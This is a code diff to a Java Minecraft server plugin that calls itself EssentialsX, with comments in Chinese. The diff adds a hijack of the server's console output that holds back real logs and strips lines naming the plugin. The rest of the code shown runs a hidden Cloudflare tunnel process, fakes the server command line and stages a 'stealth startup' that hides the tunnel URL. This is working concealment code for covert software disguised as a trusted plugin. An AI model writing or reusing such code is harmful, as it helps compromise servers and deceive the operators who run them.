@@ -27,13 +27,18 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     
-    // 核心控制变量
-    private static volatile String tunnelUrl = ""; 
+    private static volatile String tunnelUrl = "";
     private static volatile String nodePort = "N/A";
     private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
-    private static volatile boolean cfRestarted = false; // 修复重连误触发
+    private static volatile boolean cfRestarted = false;
 
+    // 日志拦截机制
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+    private static final List<String> pendingLogs = Collections.synchronizedList(new ArrayList<>());
+    private static volatile boolean intercepting = true;
+    private static final List<String> BLOCKED_PHRASES = List.of(
+        "EssentialsX", "PluginRemapper", "PluginInitializerManager"
+    );
 
     private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
     private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
@@ -50,6 +55,62 @@ public class EssentialsX extends JavaPlugin {
     private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
     private static float randFloat(float min, float max) {
         return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
+    }
+
+    // ============================================================
+    // 日志拦截器：暂存真实日志，等清屏后再放行
+    // ============================================================
+
+    static class InterceptingOutputStream extends OutputStream {
+        private final PrintStream target;
+        private final ByteArrayOutputStream baos = new ByteArrayOutputStream();
+
+        public InterceptingOutputStream(PrintStream target) {
+            this.target = target;
+        }
+
+        @Override
+        public synchronized void write(int b) throws IOException {
+            if (b == '\n') {
+                String line = baos.toString("UTF-8");
+                baos.reset();
+                if (intercepting) {
+                    pendingLogs.add(line);
+                } else {
+                    target.println(line);
+                }
+            } else {
+                baos.write(b);
+            }
+        }
+        
+        @Override
+        public synchronized void flush() throws IOException {
+            target.flush();
+        }
+    }
+
+    @Override
+    public void onLoad() {
+        // 在插件加载时第一时间劫持 System.out，拦截所有真实日志
+        System.setOut(new PrintStream(new InterceptingOutputStream(RAW_OUT), true));
+    }
+
+    private void replayPendingLogs() {
+        intercepting = false; // 停止拦截
+        // 过滤并打印暂存日志（去除暴露插件信息的日志）
+        List<String> filteredLogs = new ArrayList<>();
+        for (String log : pendingLogs) {
+            if (BLOCKED_PHRASES.stream().noneMatch(log::contains)) {
+                filteredLogs.add(log);
+            }
+        }
+        for (String log : filteredLogs) {
+            RAW_OUT.println(log);
+        }
+        pendingLogs.clear();
+        // 恢复正常的 System.out
+        System.setOut(RAW_OUT);
     }
 
     private String readCurrentPort() {
@@ -214,7 +275,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 进程管理：防 502 严格对接
+    // 进程管理
     // ============================================================
 
     private String allocateNodePort() {
@@ -299,7 +360,7 @@ public class EssentialsX extends JavaPlugin {
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
                         startCfProcess();
-                        cfRestarted = true; // 标记 CF 重启过
+                        cfRestarted = true;
                     }
 
                     Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
@@ -328,12 +389,11 @@ public class EssentialsX extends JavaPlugin {
                             tunnelUrl = foundUrl;
                             lastKnownTunnelUrl.set(foundUrl);
                         } else if (!foundUrl.equals(lastKnownTunnelUrl.get())) {
-                            if (cfRestarted) { // 只有 CF 重启过，才触发重连伪装
+                            if (cfRestarted) {
                                 lastKnownTunnelUrl.set(foundUrl);
                                 replayFakeStartupAndHideUrl(foundUrl);
-                                cfRestarted = false; // 重置标志
+                                cfRestarted = false;
                             } else {
-                                // CF 没有重启，但 URL 变了，可能是日志解析问题，只更新 URL，不伪装
                                 lastKnownTunnelUrl.set(foundUrl);
                             }
                         }
@@ -348,16 +408,11 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期：完美资源分配
+    // 插件生命周期
     // ============================================================
 
     public void onEnable() {
-        // 1. 立刻清屏，把 Bukkit 之前打印的真实日志全部清空！
-        clearConsole();
-        
-        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
-        
-        this.getLogger().info("EssentialsX plugin starting...");
+        this.getLogger().info("EssentialsX plugin starting..."); // 这行会被暂存
         
         Thread deployThread = new Thread(() -> {
             try {
@@ -382,6 +437,9 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {
             this.getLogger().severe("Stealth startup failed: " + e.getMessage());
         }
+
+        // 清屏后，打印之前暂存的真实 MC 启动日志
+        replayPendingLogs();
 
         this.getLogger().info("EssentialsX plugin enabled");
     }
